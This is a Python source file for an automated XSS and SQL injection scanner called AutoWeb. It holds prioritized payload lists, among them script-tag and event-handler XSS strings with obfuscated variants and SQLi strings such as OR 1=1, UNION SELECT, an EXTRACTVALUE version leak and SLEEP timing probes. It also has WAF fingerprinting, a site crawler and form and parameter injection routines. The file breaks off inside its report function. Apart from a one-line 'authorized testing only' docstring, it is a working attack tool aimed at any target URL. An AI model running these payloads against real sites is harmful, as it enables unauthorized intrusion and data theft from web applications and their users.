#!/usr/bin/env python3
"""
AutoWeb - Advanced XSS & SQLi Scanner (v2.4 - High Performance)
For authorized security testing only.
"""

import requests
import re
import urllib.parse
import base64
import hashlib
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed, ProcessPoolExecutor
from typing import Set, List, Tuple, Optional, Dict, Any
import argparse
import sys
import time
from requests.exceptions import RequestException, Timeout, ConnectionError
import logging
import json
from collections import defaultdict
from datetime import datetime
import urllib3
import threading
from queue import Queue
import random

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ────────────────────────────────────────
# OPTIMIZED XSS PAYLOADS - Prioritized by success rate
# ────────────────────────────────────────

XSS_PAYLOADS_FAST = [
    # High probability payloads (tested first)
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\" onmouseover=alert(1) x=\"",
    "' onmouseover=alert(1) x='",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "\" autofocus onfocus=alert(1) x=\"",
    "' autofocus onfocus=alert(1) x='",
]

XSS_PAYLOADS_MEDIUM = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src='x' onerror=alert(1)>",
    "<img src=x onerror=prompt(1)>",
    "\" onclick=alert(1) x=\"",
    "' onclick=alert(1) x='",
    "\"javascript:alert(1)\"",
    "<a href=javascript:alert(1)>click</a>",
    "<iframe src=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
]

XSS_PAYLOADS_ADVANCED_FAST = [
    "\"';--><img src=x onerror=alert(1)>",
    "\" autofocus onfocus=\"alert(1)",
    "{{constructor.constructor('alert(1)')()}}",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script>eval('al'+'ert(1)')</script>",
    "<svg><script>alert&#x28;1&#x29;</script></svg>",
    "<script>/**/alert(1)/**/</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<script>Function('alert(1)')()</script>",
    "<script>setTimeout('alert(1)')</script>",
]

ALL_XSS_PAYLOADS = XSS_PAYLOADS_FAST + XSS_PAYLOADS_MEDIUM + XSS_PAYLOADS_ADVANCED_FAST

# ────────────────────────────────────────
# OPTIMIZED SQLi PAYLOADS - Prioritized by success rate
# ────────────────────────────────────────

SQLI_PAYLOADS_FAST = [
    # High probability payloads (tested first)
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\" --",
    "OR 1=1",
    "' OR 1=1 --",
    "1' OR '1'='1",
    "admin' --",
]

SQLI_PAYLOADS_MEDIUM = [
    "' --",
    "' #",
    "' UNION SELECT 1 --",
    "1 OR 1=1",
    "1 AND 1=1",
    "1 AND 1=2",
    "'--",
    "'#",
    "')--",
    "') OR ('1'='1",
]

SQLI_PAYLOADS_ADVANCED_FAST = [
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 1=1--",
    "' OR 1=2--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' OR SLEEP(3)--",
    "' OR SLEEP(5)--",
    "' AND SLEEP(3)--",
]

ALL_SQLI_PAYLOADS = SQLI_PAYLOADS_FAST + SQLI_PAYLOADS_MEDIUM + SQLI_PAYLOADS_ADVANCED_FAST

# ────────────────────────────────────────
# SQL injection error / indicator patterns (optimized)
# ────────────────────────────────────────

SQLI_ERROR_INDICATORS = [
    "sql syntax", "mysql", "sql error", "unclosed quotation",
    "incorrect syntax", "odbc driver", "sql server",
    "ora-", "syntax error", "unknown column",
    "table doesn't exist", "conversion failed",
]

# ────────────────────────────────────────
# WAF Detection (optimized)
# ────────────────────────────────────────

WAF_DETECTION_PAYLOADS = [
    "1' OR '1'='1",
    "<script>alert(1)</script>",
    "' UNION SELECT * FROM information_schema.tables--",
]

WAF_SIGNATURES = {
    'Cloudflare': ['cloudflare-nginx', '__cfduid', 'cf-ray'],
    'ModSecurity': ['mod_security', 'modsecurity'],
    'AWS WAF': ['x-amzn-RequestId', 'x-amzn-ErrorType'],
    'F5 BIG-IP': ['BigIP', 'F5'],
    'Akamai': ['akamai', 'akamaized'],
    'Imperva': ['incapsula', 'X-Iinfo'],
    'Sucuri': ['sucuri', 'cloudproxy'],
}

# ────────────────────────────────────────
# Optimized Auto-Detection
# ────────────────────────────────────────

COMMON_PATHS_FAST = [
    '', 'index.php', 'index.html', 'index.asp', 'index.aspx', 'index.jsp',
    'home', 'main', 'default', 'portal', 'web', 'app',
    'api', 'api/v1', 'admin', 'login', 'signin', 'auth',
    'search', 'query', 'results', 'find', 'lookup',
    'product', 'products', 'item', 'items', 'category',
    'news', 'blog', 'post', 'posts', 'article', 'articles',
    'about', 'contact', 'support', 'help',
    'download', 'uploads', 'files', 'media',
    'test', 'dev', 'demo',
]

COMMON_PARAMETERS_FAST = [
    'id', 'page', 'cat', 'category', 'product', 'item', 'user', 'userid',
    'name', 'username', 'email', 'q', 'query', 's', 'search', 'keyword',
    'action', 'method', 'mode', 'type', 'format', 'view', 'sort',
    'lang', 'language', 'locale', 'debug', 'test', 'dev',
    'data', 'input', 'param', 'value', 'redirect', 'return',
    'file', 'path', 'dir', 'folder', 'filename',
    'start', 'limit', 'offset', 'page_size', 'per_page',
    'token', 'key', 'api_key', 'apikey', 'secret',
]

TECHNOLOGY_SIGNATURES = {
    'PHP': ['php', '.php', 'PHPSESSID'],
    'ASP.NET': ['asp.net', '__VIEWSTATE'],
    'JSP': ['jsp', '.jsp', 'JSESSIONID'],
    'WordPress': ['wp-content', 'wp-includes'],
    'Django': ['django', 'csrftoken'],
    'Ruby': ['rails', 'ruby'],
}

class ColorPrint:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

    @staticmethod
    def success(text):
        print(f"{ColorPrint.GREEN}{text}{ColorPrint.END}")

    @staticmethod
    def error(text):
        print(f"{ColorPrint.RED}{text}{ColorPrint.END}")

    @staticmethod
    def warning(text):
        print(f"{ColorPrint.YELLOW}{text}{ColorPrint.END}")

    @staticmethod
    def info(text):
        print(f"{ColorPrint.CYAN}{text}{ColorPrint.END}")

    @staticmethod
    def bold(text):
        print(f"{ColorPrint.BOLD}{text}{ColorPrint.END}")

    @staticmethod
    def payload_output(vuln_type, url, payload, parameter=None):
        """Print vulnerability in the format: target.com<payload>"""
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        if parameter:
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[parameter] = [payload]
            new_query = urllib.parse.urlencode(params, doseq=True)
            full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            clean_url = base_url
            if parsed.query:
                clean_url = f"{base_url}?{parsed.query}"
            
            if vuln_type.startswith('XSS'):
                print(f"{ColorPrint.RED}▶ {clean_url}{ColorPrint.END}{ColorPrint.GREEN}<{payload}>{ColorPrint.END}")
            else:
                print(f"{ColorPrint.RED}▶ {clean_url}{ColorPrint.END}{ColorPrint.YELLOW}<{payload}>{ColorPrint.END}")
        else:
            print(f"{ColorPrint.RED}▶ {base_url}{ColorPrint.END}{ColorPrint.GREEN}<{payload}>{ColorPrint.END}")

class WorkerPool:
    """Thread pool with worker management for efficient scanning"""
    
    def __init__(self, max_workers: int = 10):
        self.max_workers = max_workers
        self.workers = []
        self.task_queue = Queue()
        self.results = []
        self.lock = threading.Lock()
        self.running = False
        self.completed_tasks = 0
        self.total_tasks = 0
        
    def add_task(self, func, *args, **kwargs):
        """Add a task to the queue"""
        self.total_tasks += 1
        self.task_queue.put((func, args, kwargs))
        
    def _worker(self):
        """Worker thread that processes tasks"""
        while self.running:
            try:
                func, args, kwargs = self.task_queue.get(timeout=1)
                try:
                    result = func(*args, **kwargs)
                    with self.lock:
                        self.results.append(result)
                        self.completed_tasks += 1
                except Exception as e:
                    with self.lock:
                        self.completed_tasks += 1
                self.task_queue.task_done()
            except:
                if not self.running:
                    break
                
    def start(self):
        """Start the worker threads"""
        self.running = True
        for _ in range(self.min(self.max_workers, self.total_tasks)):
            thread = threading.Thread(target=self._worker)
            thread.daemon = True
            thread.start()
            self.workers.append(thread)
            
    def stop(self):
        """Stop all workers"""
        self.running = False
        for worker in self.workers:
            worker.join(timeout=2)
            
    def get_results(self):
        """Get all results"""
        return self.results
        
    def get_progress(self):
        """Get progress percentage"""
        if self.total_tasks == 0:
            return 100
        return (self.completed_tasks / self.total_tasks) * 100
        
    @staticmethod
    def min(a, b):
        return a if a < b else b

class AutoWebScanner:
    def __init__(self, target_url: str, threads: int = 10, timeout: int = 5,
                 cookies: Optional[Dict] = None, headers: Optional[Dict] = None,
                 crawl_depth: int = 1, delay: float = 0, xss_advanced: bool = True,
                 sqli_advanced: bool = True, auto_detect: bool = True,
                 output_file: Optional[str] = None, verbose: bool = False,
                 fast_mode: bool = True, max_workers: int = 20):
        
        self.target_url = target_url.rstrip('/')
        self.visited: Set[str] = set()
        self.forms: List[Dict] = []
        self.xss_vulns: List[Dict] = []
        self.sqli_vulns: List[Dict] = []
        self.threads = threads
        self.timeout = timeout
        self.crawl_depth = crawl_depth
        self.delay = delay
        self.xss_advanced = xss_advanced
        self.sqli_advanced = sqli_advanced
        self.auto_detect = auto_detect
        self.output_file = output_file
        self.verbose = verbose
        self.fast_mode = fast_mode
        self.max_workers = max_workers
        self.waf_detected = False
        self.waf_name = "None"
        self.technologies = set()
        self.all_parameters = set()
        self.discovered_urls = set()
        self.vuln_lock = threading.Lock()
        self.found_xss = 0
        self.found_sqli = 0
        
        # Session setup
        self.session = requests.Session()
        self.session.headers.update(headers or {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        })
        if cookies:
            self.session.cookies.update(cookies)
        self.domain = urlparse(target_url).netloc
        self.request_count = 0
        self.max_requests = 5000
        self.start_time = datetime.now()
        self.thread_pool = None
        
        # Cache for responses
        self.response_cache = {}
        self.cache_lock = threading.Lock()
        
        if self.output_file:
            self.output_handle = open(self.output_file, 'w')
            self.output_handle.write(f"# AutoWeb Scan Results - {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            self.output_handle.write(f"# Target: {self.target_url}\n\n")

    def get_xss_payloads(self) -> List[str]:
        """Get XSS payloads optimized for speed"""
        if self.fast_mode:
            return XSS_PAYLOADS_FAST + (XSS_PAYLOADS_ADVANCED_FAST if self.xss_advanced else [])
        return XSS_PAYLOADS_FAST + XSS_PAYLOADS_MEDIUM + (XSS_PAYLOADS_ADVANCED_FAST if self.xss_advanced else [])

    def get_sqli_payloads(self) -> List[str]:
        """Get SQLi payloads optimized for speed"""
        if self.fast_mode:
            return SQLI_PAYLOADS_FAST + (SQLI_PAYLOADS_ADVANCED_FAST if self.sqli_advanced else [])
        return SQLI_PAYLOADS_FAST + SQLI_PAYLOADS_MEDIUM + (SQLI_PAYLOADS_ADVANCED_FAST if self.sqli_advanced else [])

    def safe_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """Make a safe request with caching and error handling"""
        # Check cache first
        cache_key = f"{method}:{url}:{str(kwargs.get('params', ''))}:{str(kwargs.get('data', ''))}"
        
        with self.cache_lock:
            if cache_key in self.response_cache:
                return self.response_cache[cache_key]
        
        if self.request_count >= self.max_requests:
            return None
        
        try:
            if self.delay:
                time.sleep(self.delay)
            
            self.request_count += 1
            kwargs.setdefault('timeout', self.timeout)
            kwargs.setdefault('verify', False)
            kwargs.setdefault('allow_redirects', True)
            
            if method.lower() == 'get':
                response = self.session.get(url, **kwargs)
            elif method.lower() == 'post':
                response = self.session.post(url, **kwargs)
            elif method.lower() == 'head':
                response = self.session.head(url, **kwargs)
            else:
                return None
            
            # Cache successful responses
            with self.cache_lock:
                self.response_cache[cache_key] = response
                if len(self.response_cache) > 1000:  # Limit cache size
                    # Remove oldest entries
                    keys = list(self.response_cache.keys())
                    for key in keys[:100]:
                        del self.response_cache[key]
            
            return response
            
        except (Timeout, ConnectionError) as e:
            return None
        except Exception as e:
            return None

    def log_to_file(self, text: str):
        """Write output to file if specified"""
        if self.output_file:
            self.output_handle.write(text + '\n')
            self.output_handle.flush()

    # ────────────────────────────────────────
    # Optimized Auto-Detection
    # ────────────────────────────────────────

    def detect_technologies(self, html: str, headers: Dict) -> None:
        """Quick technology detection"""
        if not html:
            return
            
        content = html.lower()[:10000]  # Only check first 10k chars for speed
        header_str = str(headers).lower()
        
        for tech, signatures in TECHNOLOGY_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in content or sig.lower() in header_str:
                    self.technologies.add(tech)
                    break

    def discover_common_paths(self) -> Set[str]:
        """Quick discovery of common paths"""
        discovered = set()
        paths_to_test = COMMON_PATHS_FAST[:15]  # Limit for speed
        
        if self.verbose:
            print("[*] Quick path discovery...")
        
        for path in paths_to_test:
            test_url = f"{self.target_url}/{path}"
            r = self.safe_request('head', test_url)
            if r and r.status_code < 400:
                discovered.add(test_url)
                self.discovered_urls.add(test_url)
        
        return discovered

    def get_common_parameters(self) -> Set[str]:
        """Get common parameters"""
        return set(COMMON_PARAMETERS_FAST)

    def discover_dynamic_parameters(self) -> Dict[str, List[str]]:
        """Quick discovery of dynamic parameters"""
        discovered_params = {}
        
        for url in list(self.discovered_urls)[:10]:  # Limit for speed
            r = self.safe_request('get', url)
            if r and r.status_code == 200:
                forms = self.extract_forms(r.text, url)
                for form in forms:
                    for inp in form['inputs']:
                        if inp['name'] not in discovered_params:
                            discovered_params[inp['name']] = [url]
                        elif url not in discovered_params[inp['name']]:
                            discovered_params[inp['name']].append(url)
        
        for param in discovered_params:
            self.all_parameters.add(param)
        
        return discovered_params

    # ────────────────────────────────────────
    # Optimized WAF Detection
    # ────────────────────────────────────────

    def detect_waf(self) -> str:
        """Quick WAF detection"""
        ColorPrint.info("[*] Quick WAF check...")
        
        # Fast detection with single request
        try:
            test_payload = WAF_DETECTION_PAYLOADS[0]
            r = self.safe_request('get', self.target_url, params={'test': test_payload})
            if r:
                for waf_name, sigs in WAF_SIGNATURES.items():
                    for sig in sigs:
                        if sig.lower() in str(r.headers).lower():
                            self.waf_detected = True
                            self.waf_name = waf_name
                            ColorPrint.warning(f"[!] WAF Detected: {waf_name}")
                            return f"WAF Detected: {waf_name}"
        except:
            pass
        
        ColorPrint.info("[*] No WAF detected")
        return "No WAF detected"

    # ────────────────────────────────────────
    # Optimized Crawling with Worker Pool
    # ────────────────────────────────────────

    def extract_links(self, html: str, base_url: str) -> Set[str]:
        """Extract links from HTML"""
        links = set()
        try:
            soup = BeautifulSoup(html, 'html.parser')
            
            for tag in soup.find_all(['a', 'link']):
                href = tag.get('href')
                if href:
                    full_url = urljoin(base_url, href)
                    parsed = urlparse(full_url)
                    if parsed.netloc == self.domain and parsed.scheme.startswith('http'):
                        clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}".rstrip('/')
                        links.add(clean)
                        
            for form in soup.find_all('form'):
                action = form.get('action')
                if action:
                    full_url = urljoin(base_url, action)
                    parsed = urlparse(full_url)
                    if parsed.netloc == self.domain:
                        links.add(f"{parsed.scheme}://{parsed.netloc}{parsed.path}".rstrip('/'))
        except:
            pass
        return links

    def extract_forms(self, html: str, base_url: str) -> List[Dict]:
        """Extract forms from HTML"""
        forms = []
        try:
            soup = BeautifulSoup(html, 'html.parser')
            
            for form in soup.find_all('form'):
                action = form.get('action')
                method = form.get('method', 'get').lower()
                form_url = urljoin(base_url, action) if action else base_url
                
                inputs = []
                for inp in form.find_all(['input', 'textarea', 'select']):
                    input_name = inp.get('name')
                    input_type = inp.get('type', 'text').lower()
                    if input_name:
                        inputs.append({
                            'name': input_name,
                            'type': input_type,
                            'value': inp.get('value', ''),
                        })
                
                if inputs:
                    forms.append({
                        'url': form_url,
                        'method': method,
                        'inputs': inputs,
                    })
        except:
            pass
        return forms

    def extract_url_params(self, url: str) -> List[str]:
        """Extract parameters from URL"""
        parsed = urlparse(url)
        return list(parse_qs(parsed.query, keep_blank_values=True).keys())

    def crawl_page(self, url: str, depth: int = 0) -> Dict:
        """Crawl a single page"""
        if depth > self.crawl_depth or url in self.visited:
            return {'forms': [], 'params': [], 'links': []}
        
        self.visited.add(url)
        result = {'forms': [], 'params': [], 'links': []}
        
        try:
            r = self.safe_request('get', url)
            if not r or r.status_code != 200:
                return result
            
            html = r.text
            
            # Detect technologies
            self.detect_technologies(html, r.headers)
            
            # Extract forms
            forms = self.extract_forms(html, url)
            if forms:
                with self.vuln_lock:
                    self.forms.extend(forms)
                result['forms'] = forms
            
            # Extract parameters
            params = self.extract_url_params(url)
            if params:
                with self.vuln_lock:
                    self.all_parameters.update(params)
                result['params'] = params
            
            # Extract links for further crawling
            if depth < self.crawl_depth:
                links = self.extract_links(html, url)
                result['links'] = links
            
        except Exception as e:
            if self.verbose:
                print(f"  [!] Error crawling {url}: {str(e)[:50]}")
        
        return result

    def crawl(self, url: str, depth: int = 0):
        """Crawl with worker pool for speed"""
        if self.verbose:
            ColorPrint.info(f"[*] Starting optimized crawl (depth: {self.crawl_depth})...")
        
        # Create worker pool for crawling
        crawler_pool = WorkerPool(max_workers=min(self.max_workers, 10))
        tasks = []
        
        # Initial crawl
        tasks.append((url, depth))
        processed = set([url])
        
        # Process tasks
        while tasks:
            current_batch = tasks[:20]  # Process in batches
            tasks = tasks[20:]
            
            # Create workers for this batch
            batch_pool = WorkerPool(max_workers=min(self.max_workers, len(current_batch)))
            
            for crawl_url, crawl_depth in current_batch:
                batch_pool.add_task(self.crawl_page, crawl_url, crawl_depth)
            
            batch_pool.start()
            batch_pool.stop()
            
            # Process results
            for result in batch_pool.get_results():
                new_links = result.get('links', [])
                for link in new_links:
                    if link not in processed and len(processed) < 100:  # Limit pages
                        processed.add(link)
                        tasks.append((link, depth + 1))
                        
                if self.verbose and result.get('forms'):
                    print(f"  [Forms] Found {len(result['forms'])} form(s)")
        
        if self.verbose:
            ColorPrint.info(f"[*] Crawl complete. Visited {len(self.visited)} page(s), found {len(self.forms)} form(s)")

    # ────────────────────────────────────────
    # Optimized Vulnerability Testing
    # ────────────────────────────────────────

    def is_payload_reflected(self, payload: str, response_text: str) -> bool:
        """Check if payload is reflected (optimized)"""
        if not response_text:
            return False
            
        # Quick exact match
        if payload in response_text:
            return True
            
        # Check common encodings
        if urllib.parse.quote(payload) in response_text:
            return True
        if payload.replace('<', '&lt;').replace('>', '&gt;') in response_text:
            return True
            
        return False

    def test_xss_reflected(self, url: str, param: str) -> Optional[Dict]:
        """Test for reflected XSS (optimized)"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        for payload in self.get_xss_payloads():
            try:
                test_params = params.copy()
                test_params[param] = [payload]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                
                r = self.safe_request('get', test_url)
                if r and self.is_payload_reflected(payload, r.text):
                    return {
                        'type': 'XSS (Reflected)',
                        'url': test_url,
                        'parameter': param,
                        'payload': payload[:100],
                        'full_url': test_url
                    }
            except:
                continue
        return None

    def test_xss_form(self, form: Dict) -> List[Dict]:
        """Test XSS in forms (optimized)"""
        findings = []
        url = form['url']
        method = form['method']
        
        for inp in form['inputs']:
            if inp['type'] in ['submit', 'button', 'reset', 'image']:
                continue
                
            for payload in self.get_xss_payloads():
                try:
                    form_data = {}
                    for other_inp in form['inputs']:
                        if other_inp['name'] == inp['name']:
                            form_data[other_inp['name']] = payload
                        elif other_inp['type'] not in ['submit', 'button', 'reset']:
                            form_data[other_inp['name']] = other_inp.get('value', 'test')
                    
                    if method == 'post':
                        r = self.safe_request('post', url, data=form_data)
                    else:
                        r = self.safe_request('get', url, params=form_data)
                    
                    if r and self.is_payload_reflected(payload, r.text):
                        findings.append({
                            'type': 'XSS (Form)',
                            'url': url,
                            'parameter': inp['name'],
                            'payload': payload[:100],
                            'method': method.upper(),
                            'full_url': url
                        })
                        break
                except:
                    continue
        return findings

    def test_sqli_reflected(self, url: str, param: str) -> Optional[Dict]:
        """Test for SQL injection (optimized)"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        # Get baseline
        baseline_r = self.safe_request('get', url)
        if not baseline_r:
            return None
            
        baseline_length = len(baseline_r.text)
        baseline_status = baseline_r.status_code
        
        for payload in self.get_sqli_payloads():
            try:
                test_params = params.copy()
                test_params[param] = [payload]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                
                start_time = time.time()
                r = self.safe_request('get', test_url)
                if not r:
                    continue
                elapsed = time.time() - start_time
                
                # Error-based detection
                if any(pattern in r.text.lower() for pattern in SQLI_ERROR_INDICATORS):
                    return {
                        'type': 'SQLi (Error-based)',
                        'url': test_url,
                        'parameter': param,
                        'payload': payload[:100],
                        'full_url': test_url
                    }
                
                # Boolean-based detection
                if abs(len(r.text) - baseline_length) > baseline_length * 0.3:
                    if any(x in payload.lower() for x in ['or', 'and', 'union']):
                        return {
                            'type': 'SQLi (Boolean-based)',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload[:100],
                            'full_url': test_url
                        }
                
                # Time-based detection
                if elapsed >= self.timeout * 0.7:
                    if any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark']):
                        return {
                            'type': 'SQLi (Time-based)',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload[:100],
                            'full_url': test_url,
                            'detail': f'{elapsed:.2f}s'
                        }
                        
            except Timeout:
                if any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark']):
                    return {
                        'type': 'SQLi (Time-based - timeout)',
                        'url': url,
                        'parameter': param,
                        'payload': payload[:100],
                        'full_url': url
                    }
            except:
                continue
                
        return None

    def test_sqli_form(self, form: Dict) -> List[Dict]:
        """Test SQL injection in forms (optimized)"""
        findings = []
        url = form['url']
        method = form['method']
        
        # Get baseline
        try:
            baseline_data = {}
            for inp in form['inputs']:
                if inp['type'] not in ['submit', 'button', 'reset', 'image']:
                    baseline_data[inp['name']] = inp.get('value', '1')
            
            if method == 'post':
                baseline_r = self.safe_request('post', url, data=baseline_data)
            else:
                baseline_r = self.safe_request('get', url, params=baseline_data)
            
            baseline_length = len(baseline_r.text) if baseline_r else 0
        except:
            baseline_length = 0
        
        for inp in form['inputs']:
            if inp['type'] in ['submit', 'button', 'reset', 'image', 'hidden']:
                continue
                
            for payload in self.get_sqli_payloads():
                try:
                    form_data = {}
                    for other_inp in form['inputs']:
                        if other_inp['name'] == inp['name']:
                            form_data[other_inp['name']] = payload
                        elif other_inp['type'] not in ['submit', 'button', 'reset']:
                            form_data[other_inp['name']] = other_inp.get('value', 'test')
                    
                    start_time = time.time()
                    if method == 'post':
                        r = self.safe_request('post', url, data=form_data)
                    else:
                        r = self.safe_request('get', url, params=form_data)
                    
                    if not r:
                        continue
                    elapsed = time.time() - start_time
                    
                    if any(pattern in r.text.lower() for pattern in SQLI_ERROR_INDICATORS):
                        findings.append({
                            'type': 'SQLi (Error - Form)',
                            'url': url,
                            'parameter': inp['name'],
                            'payload': payload[:100],
                            'method': method.upper(),
                            'full_url': url
                        })
                        break
                    
                    if baseline_length > 0 and abs(len(r.text) - baseline_length) > baseline_length * 0.3:
                        if any(x in payload.lower() for x in ['or', 'and', 'union']):
                            findings.append({
                                'type': 'SQLi (Boolean - Form)',
                                'url': url,
                                'parameter': inp['name'],
                                'payload': payload[:100],
                                'method': method.upper(),
                                'full_url': url
                            })
                            break
                    
                    if elapsed >= self.timeout * 0.7:
                        if any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark']):
                            findings.append({
                                'type': 'SQLi (Time - Form)',
                                'url': url,
                                'parameter': inp['name'],
                                'payload': payload[:100],
                                'method': method.upper(),
                                'full_url': url,
                                'detail': f'{elapsed:.2f}s'
                            })
                            break
                            
                except Timeout:
                    if any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark']):
                        findings.append({
                            'type': 'SQLi (Time - Form)',
                            'url': url,
                            'parameter': inp['name'],
                            'payload': payload[:100],
                            'method': method.upper(),
                            'full_url': url
                        })
                        break
                except:
                    continue
                    
        return findings

    # ────────────────────────────────────────
    # Optimized Scanning with Worker Pool
    # ────────────────────────────────────────

    def scan_xss(self):
        """XSS scanning with worker pool for speed"""
        ColorPrint.bold("\n[===== XSS SCAN =====]")
        all_findings = []
        
        # Build parameter list
        param_tasks = []
        
        # Get parameters from visited pages
        for url in list(self.visited):
            params = self.extract_url_params(url)
            for param in params:
                param_tasks.append((url, param))
        
        # Add common parameters
        if self.auto_detect and param_tasks:
            common_params = self.get_common_parameters()
            for url in list(self.visited)[:5]:
                for param in common_params:
                    param_tasks.append((url, param))
        
        # Remove duplicates
        param_tasks = list(set(param_tasks))
        
        if not param_tasks:
            ColorPrint.info("[*] No parameters to test")
            return []
        
        payloads_count = len(self.get_xss_payloads())
        ColorPrint.info(f"[*] Testing {len(param_tasks)} parameters with {payloads_count} XSS payloads...")
        
        # Use worker pool for testing
        test_pool = WorkerPool(max_workers=min(self.max_workers, len(param_tasks)))
        
        # Add tasks
        for url, param in param_tasks:
            test_pool.add_task(self.test_xss_reflected, url, param)
        
        # Start workers
        test_pool.start()
        
        # Wait for completion with progress
        while test_pool.completed_tasks < test_pool.total_tasks:
            progress = test_pool.get_progress()
            if self.verbose and progress % 10 < 1:
                print(f"  Progress: {progress:.1f}%", end='\r')
            time.sleep(0.5)
        
        test_pool.stop()
        
        # Process results
        for result in test_pool.get_results():
            if result:
                all_findings.append(result)
                ColorPrint.payload_output('XSS', result['url'], result['payload'], result['parameter'])
                self.log_to_file(f"{result['full_url']}<{result['payload']}>")
                with self.vuln_lock:
                    self.found_xss += 1
        
        # Test forms
        if self.forms:
            ColorPrint.info(f"[*] Testing {len(self.forms)} form(s) for XSS...")
            form_pool = WorkerPool(max_workers=min(self.max_workers, len(self.forms)))
            
            for form in self.forms:
                form_pool.add_task(self.test_xss_form, form)
            
            form_pool.start()
            
            while form_pool.completed_tasks < form_pool.total_tasks:
                time.sleep(0.5)
            
            form_pool.stop()
            
            for results in form_pool.get_results():
                for result in results:
                    all_findings.append(result)
                    ColorPrint.payload_output('XSS', result['url'], result['payload'], result['parameter'])
                    self.log_to_file(f"{result['full_url']}<{result['payload']}>")
                    with self.vuln_lock:
                        self.found_xss += 1
        
        self.xss_vulns = all_findings
        if all_findings:
            ColorPrint.success(f"[+] Found {len(all_findings)} XSS vulnerability(ies)")
        else:
            ColorPrint.info("[*] No XSS vulnerabilities found")
        
        return all_findings

    def scan_sqli(self):
        """SQLi scanning with worker pool for speed"""
        ColorPrint.bold("\n[===== SQLi SCAN =====]")
        all_findings = []
        
        # Build parameter list
        param_tasks = []
        
        # Get parameters from visited pages
        for url in list(self.visited):
            params = self.extract_url_params(url)
            for param in params:
                param_tasks.append((url, param))
        
        # Add common parameters
        if self.auto_detect and param_tasks:
            common_params = self.get_common_parameters()
            for url in list(self.visited)[:5]:
                for param in common_params:
                    param_tasks.append((url, param))
        
        # Remove duplicates
        param_tasks = list(set(param_tasks))
        
        if not param_tasks:
            ColorPrint.info("[*] No parameters to test")
            return []
        
        payloads_count = len(self.get_sqli_payloads())
        ColorPrint.info(f"[*] Testing {len(param_tasks)} parameters with {payloads_count} SQLi payloads...")
        
        # Use worker pool for testing
        test_pool = WorkerPool(max_workers=min(self.max_workers, len(param_tasks)))
        
        # Add tasks
        for url, param in param_tasks:
            test_pool.add_task(self.test_sqli_reflected, url, param)
        
        # Start workers
        test_pool.start()
        
        # Wait for completion with progress
        while test_pool.completed_tasks < test_pool.total_tasks:
            progress = test_pool.get_progress()
            if self.verbose and progress % 10 < 1:
                print(f"  Progress: {progress:.1f}%", end='\r')
            time.sleep(0.5)
        
        test_pool.stop()
        
        # Process results
        for result in test_pool.get_results():
            if result:
                all_findings.append(result)
                ColorPrint.payload_output('SQLi', result['url'], result['payload'], result['parameter'])
                self.log_to_file(f"{result['full_url']}<{result['payload']}>")
                with self.vuln_lock:
                    self.found_sqli += 1
        
        # Test forms
        if self.forms:
            ColorPrint.info(f"[*] Testing {len(self.forms)} form(s) for SQLi...")
            form_pool = WorkerPool(max_workers=min(self.max_workers, len(self.forms)))
            
            for form in self.forms:
                form_pool.add_task(self.test_sqli_form, form)
            
            form_pool.start()
            
            while form_pool.completed_tasks < form_pool.total_tasks:
                time.sleep(0.5)
            
            form_pool.stop()
            
            for results in form_pool.get_results():
                for result in results:
                    all_findings.append(result)
                    ColorPrint.payload_output('SQLi', result['url'], result['payload'], result['parameter'])
                    self.log_to_file(f"{result['full_url']}<{result['payload']}>")
                    with self.vuln_lock:
                        self.found_sqli += 1
        
        self.sqli_vulns = all_findings
        if all_findings:
            ColorPrint.success(f"[+] Found {len(all_findings)} SQLi vulnerability(ies)")
        else:
            ColorPrint.info("[*] No SQL injection vulnerabilities found")
        
        return all_findings

    # ────────────────────────────────────────
    # Report Generation
    # ────────────────────────────────────────

    def generate_report(self):
        """Generate final report"""
        print("\n" + "=" * 70)
